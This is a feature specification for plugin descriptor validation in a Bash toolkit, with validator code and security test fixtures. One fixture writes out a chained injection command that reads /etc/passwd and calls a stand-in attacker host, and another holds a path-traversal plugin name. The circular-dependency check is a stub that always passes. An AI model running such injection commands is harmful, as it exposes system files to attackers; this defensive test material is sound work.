# Feature: Plugin Security and Validation

**ID**: 0012  
**Type**: Feature Implementation  
**Status**: Analyze  
**Created**: 2026-02-09  
**Updated**: 2026-02-09 (Moved to analyze)  
**Priority**: Critical (Security)

## Overview
Implement comprehensive plugin descriptor validation, security checks, and integrity verification to prevent malicious or malformed plugins from executing and compromising system security.

## Description
Create a plugin security subsystem that validates plugin descriptors against strict schemas, checks for command injection patterns, verifies file paths are within safe boundaries, detects circular dependencies, validates data type specifications, and enforces security policies before allowing plugin execution. This feature acts as a security gate, preventing malicious plugins from exploiting the plugin architecture.

Plugin security is critical because plugins execute external commands and access filesystem, making them a primary attack surface for the toolkit.

## Business Value
- Prevents command injection attacks through plugin descriptors
- Prevents path traversal attacks from malicious plugins
- Ensures data integrity through schema validation
- Enables safe plugin ecosystem development
- Protects users from malicious third-party plugins
- Critical security foundation for plugin architecture

## Related Requirements
- [req_0047](../../01_vision/02_requirements/03_accepted/req_0047_plugin_descriptor_validation.md) - Plugin Descriptor Validation (PRIMARY - Risk 320)
- [req_0049](../../01_vision/02_requirements/03_accepted/req_0049_template_injection_prevention.md) - Template Injection Prevention
- [req_0052](../../01_vision/02_requirements/03_accepted/req_0052_secure_defaults_and_configuration_hardening.md) - Secure Defaults
- [req_0024](../../01_vision/02_requirements/03_accepted/req_0024_plugin_dependency_graph_construction.md) - Dependency Graph (circular detection)

## Acceptance Criteria

### Schema Validation
- [ ] System validates all required fields present in descriptor: `name`, `description`, `active`
- [ ] System validates field types match expected types (string, boolean, array, object)
- [ ] System validates `name` field: alphanumeric + underscore/hyphen only, 3-50 characters
- [ ] System validates `description` field: non-empty, max 500 characters
- [ ] System validates `active` field: boolean true/false
- [ ] System validates `consumes` array: strings, valid data field names
- [ ] System validates `provides` array: strings, valid data field names
- [ ] System validates `processes` object (optional): valid MIME types and extensions
- [ ] System rejects descriptors with unknown/unexpected fields (strict mode)

### Command Validation (`execute_commandline`)
- [ ] System validates `execute_commandline` field is present and non-empty
- [ ] System checks for command injection patterns:
  - Shell metacharacters in unsafe positions: `;`, `|`, `&`, `$()`, `` ` ``
  - Redirection operators: `>`, `>>`, `<`
  - Variable expansion in command portions: `${...}`
- [ ] System validates command uses safe patterns: `read -r` for output capture
- [ ] System validates command doesn't attempt filesystem write operations (no `>`, `tee`)
- [ ] System validates command doesn't invoke interpreters directly (`bash -c`, `sh -c`, `eval`)
- [ ] System whitelists allowed command patterns (provide safe templates)

### Path Validation
- [ ] System validates plugin directory name matches descriptor `name` field
- [ ] System validates plugin directory is within plugins root (no path traversal)
- [ ] System validates no symlinks to external locations
- [ ] System validates plugin files don't reference absolute paths outside workspace
- [ ] System validates `execute_commandline` doesn't reference paths outside plugin directory

### Circular Dependency Detection
- [ ] System detects circular dependencies in `consumes`/`provides` chains
- [ ] System builds dependency graph and validates it's acyclic (DAG)
- [ ] System reports exact circular dependency chain in error message
- [ ] System rejects plugin set with circular dependencies (fail fast)

### Data Type Validation
- [ ] System validates `consumes` fields reference valid data types
- [ ] System validates `provides` fields declare valid data types
- [ ] System validates data field names follow naming conventions (alphanumeric, underscores)
- [ ] System validates no duplicate field names in `provides`

### File Type Filter Validation
- [ ] System validates `processes.mime_types` contains valid MIME type patterns
- [ ] System validates `processes.file_extensions` contains valid extensions (start with `.`)
- [ ] System validates MIME types against known type list (warn for unknown)
- [ ] System validates no conflicting file type filters across plugins

### Security Policy Enforcement
- [ ] System enforces secure defaults: plugins disabled (`active: false`) until explicitly enabled
- [  ] System requires plugin approval/signature for system-wide installation (future enhancement)
- [ ] System logs all plugin validation failures with details
- [ ] System quarantines invalid plugins (mark as inactive, don't execute)
- [ ] System provides security audit log of plugin validations

### Validation Reporting
- [ ] System reports validation errors with specific field and reason
- [ ] System reports validation warnings (non-critical issues)
- [ ] System provides line numbers or field paths for errors
- [ ] System aggregates all validation errors (don't fail on first error)
- [ ] System provides actionable guidance for fixing validation errors

### Error Handling
- [ ] System handles malformed JSON gracefully (report syntax error)
- [ ] System handles missing descriptor files (skip plugin with warning)
- [ ] System handles permission errors reading descriptors
- [ ] System continues validating remaining plugins after encountering errors
- [ ] System exits with error if any CRITICAL validation failures found

## Technical Considerations

### Implementation Approach
```bash
validate_plugin_descriptor() {
  local descriptor_file="$1"
  local plugin_dir=$(dirname "$descriptor_file")
  
  log "DEBUG" "VALIDATOR" "Validating descriptor: $descriptor_file"
  
  # Validate JSON syntax
  if ! jq empty "$descriptor_file" 2>/dev/null; then
    log "ERROR" "VALIDATOR" "Invalid JSON syntax: $descriptor_file"
    return 1
  fi
  
  # Validate required fields
  for field in name description active; do
    if ! jq -e "has(\"$field\")" "$descriptor_file" >/dev/null; then
      log "ERROR" "VALIDATOR" "Missing required field '$field': $descriptor_file"
      return 1
    fi
  done
  
  # Validate name field
  local plugin_name
  plugin_name=$(jq -r '.name' "$descriptor_file")
  if ! [[ "$plugin_name" =~ ^[a-zA-Z0-9_-]{3,50}$ ]]; then
    log "ERROR" "VALIDATOR" "Invalid plugin name '$plugin_name': must be 3-50 alphanumeric/underscore/hyphen chars"
    return 1
  fi
  
  # Validate execute command
  local execute_cmd
  execute_cmd=$(jq -r '.execute_commandline // empty' "$descriptor_file")
  if [[ -z "$execute_cmd" ]]; then
    log "ERROR" "VALIDATOR" "Missing execute_commandline: $descriptor_file"
    return 1
  fi
  
  if ! validate_command_safety "$execute_cmd"; then
    log "ERROR" "VALIDATOR" "Unsafe command pattern in $descriptor_file: $execute_cmd"
    return 1
  fi
  
  # Validate consumes/provides
  if ! validate_data_fields "$descriptor_file" "consumes"; then
    return 1
  fi
  
  if ! validate_data_fields "$descriptor_file" "provides"; then
    return 1
  fi
  
  # Validate file type filters
  if ! validate_processes_field "$descriptor_file"; then
    return 1
  fi
  
  # Validate plugin directory path
  local plugin_dir_name=$(basename "$plugin_dir")
  if [[ "$plugin_dir_name" != "$plugin_name" ]]; then
    log "WARN" "VALIDATOR" "Plugin directory name '$plugin_dir_name' doesn't match plugin name '$plugin_name'"
  fi
  
  # Validate no path traversal
  if [[ "$plugin_dir" == *".."* ]]; then
    log "ERROR" "VALIDATOR" "Path traversal detected in plugin directory: $plugin_dir"
    return 1
  fi
  
  log "INFO" "VALIDATOR" "Plugin validated successfully: $plugin_name"
  return 0
}

validate_command_safety() {
  local command="$1"
  
  # Check for command injection patterns
  local unsafe_patterns=(
    ';'          # Command chaining
    '|'          # Pipes (unless in read pattern)
    '&&'         # Logical AND
    '||'         # Logical OR
    '$('         # Command substitution
    '`'          # Backtick substitution
    'eval'       # Eval command
    'bash -c'    # Shell invocation
    'sh -c'      # Shell invocation
    '>'          # Output redirection
    '<'          # Input redirection
  )
  
  for pattern in "${unsafe_patterns[@]}"; do
    if [[ "$command" == *"$pattern"* ]]; then
      # Allow pipes only in safe read pattern
      if [[ "$pattern" == "|" ]] && [[ "$command" == *"| read -r"* ]]; then
        continue
      fi
      log "ERROR" "VALIDATOR" "Unsafe pattern detected: $pattern"
      return 1
    fi
  done
  
  # Validate uses safe output capture pattern
  if ! [[ "$command" == *"read -r"* ]]; then
    log "WARN" "VALIDATOR" "Command doesn't use recommended 'read -r' output capture pattern"
  fi
  
  return 0
}

validate_data_fields() {
  local descriptor_file="$1"
  local field_type="$2"  # consumes or provides
  
  local field_count
  field_count=$(jq ".${field_type} | length" "$descriptor_file" 2>/dev/null || echo "0")
  
  if   [[ "$field_count" -eq 0 ]]; then
    # Empty is valid (no dependencies or outputs)
    return 0
  fi
  
  # Validate each field name
  local -a field_names
  mapfile -t field_names < <(jq -r ".${field_type}[]" "$descriptor_file")
  
  for field_name in "${field_names[@]}"; do
    if ! [[ "$field_name" =~ ^[a-zA-Z_][a-zA-Z0-9_.]*$ ]]; then
      log "ERROR" "VALIDATOR" "Invalid data field name '$field_name' in $field_type"
      return 1
    fi
  done
  
  return 0
}

validate_processes_field() {
  local descriptor_file="$1"
  
  # Check if processes field exists
  if ! jq -e 'has("processes")' "$descriptor_file" >/dev/null; then
    # Optional field, absence is valid
    return 0
  fi
  
  # Validate MIME types
  if jq -e '.processes.mime_types' "$descriptor_file" >/dev/null; then
    local -a mime_types
    mapfile -t mime_types < <(jq -r '.processes.mime_types[]' "$descriptor_file")
    
    for mime in "${mime_types[@]}"; do
      if ! [[ "$mime" =~ ^[a-z]+/[a-z0-9+.-]+$ ]]; then
        log "WARN" "VALIDATOR" "Invalid MIME type format: $mime"
      fi
    done
  fi
  
  # Validate extensions
  if jq -e '.processes.file_extensions' "$descriptor_file" >/dev/null; then
    local -a extensions
    mapfile -t extensions < <(jq -r '.processes.file_extensions[]' "$descriptor_file")
    
    for ext in "${extensions[@]}"; do
      if ! [[ "$ext" =~ ^\.[a-zA-Z0-9]+$ ]]; then
        log "ERROR" "VALIDATOR" "Invalid file extension format: $ext (must start with '.')"
        return 1
      fi
    done
  fi
  
  return 0
}

detect_circular_dependencies() {
  local plugins_dir="$1"
  
  # Build dependency graph
  declare -A graph
  declare -A in_degree
  
  # Algorithm: Tarian's algorithm for cycle detection
  # Implementation would go here
  
  # For now, placeholder:
  log "DEBUG" "VALIDATOR" "Checking for circular dependencies..."
  
  # Return 0 if no cycles, 1 if cycle detected
  return 0
}
```

### Security Tests
```bash
# Test injection attempt
{
  "name": "malicious",
  "description": "Malicious plugin",
  "active": true,
  "execute_commandline": "cat /etc/passwd; curl evil.com",
  "consumes": [],
  "provides": ["data"]
}
# Expected: Validation failure (command injection detected)

# Test path traversal
{
  "name": "../../../evil",
  "description": "Path traversal",
  "active": true,
  "execute_commandline": "echo data",
  "consumes": [],
  "provides": ["data"]
}
# Expected: Validation failure (path traversal detected)

# Test valid plugin
{
  "name": "safe_plugin",
  "description": "Safe plugin",
  "active": true,
  "execute_commandline": "stat -c '%s' \"$FILE_PATH\" | read -r file_size",
  "consumes": ["file_path_absolute"],
  "provides": ["file_size"]
}
# Expected: Validation success
```

### Integration Points
- **Plugin Manager**: Validates descriptors during plugin discovery
- **Execution Orchestrator**: Only executes validated plugins
- **Security Logging**: Records validation failures

### Dependencies
- Plugin discovery (feature_0003) ✅
- Logging infrastructure (feature_0001) ✅

### Performance Considerations
- Cache validation results (validate once per plugin load)
- Efficient regex matching for pattern detection
- Quick-fail validation (stop on critical errors)

### Security Considerations
- Fail-secure: Invalid plugins are NOT executed
- Comprehensive validation (defense-in-depth)
- Clear audit trail of validation events
- No bypass mechanisms
- Regular security review of validation rules

## Dependencies
- Requires: Basic script structure (feature_0001) ✅
- Requires: Plugin listing (feature_0003) ✅
- Blocks: Plugin execution (feature_0009) - must validate before execution

## Testing Strategy
- Unit tests: Schema validation for all field types
- Unit tests: Command injection pattern detection
- Unit tests: Path validation and traversal detection
- Unit tests: Circular dependency detection
- Security tests: Malicious descriptor attempts
- Security tests: Boundary cases (max lengths, special characters)
- Integration tests: Valid plugin acceptance
- Integration tests: Invalid plugin rejection

## Definition of Done
- [ ] All acceptance criteria met
- [ ] Unit tests passing with >90% coverage
- [ ] Security tests passing (injection prevention)
- [ ] Code reviewed and security approved
- [ ] Documentation updated (security policies, validation rules)
- [ ] Security audit completed
- [ ] Penetration testing performed
